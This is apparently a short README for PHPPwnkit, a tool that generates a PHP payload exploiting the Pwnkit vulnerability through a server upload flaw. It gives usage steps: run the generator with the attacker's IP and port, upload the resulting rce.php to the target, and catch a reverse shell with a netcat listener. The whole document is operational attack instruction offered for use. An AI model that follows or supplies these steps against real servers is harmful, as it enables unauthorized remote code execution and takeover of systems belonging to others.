# PHPPwnkit
PHPPwnkit generates a payload in PHP in order to exploit the Pwnkit vulnerability.
The attack requires an upload flaw with write permissions.
````
php PHPPwnkit 192.168.1.1 4444
````
The IP is yours and the port is the one on which you will listen in order to have your reverse shell.

This command generates an rce.php file. Simply upload the file to the target server and listen, as part of a reverse shell

```
nc -lnv -p 4444
```
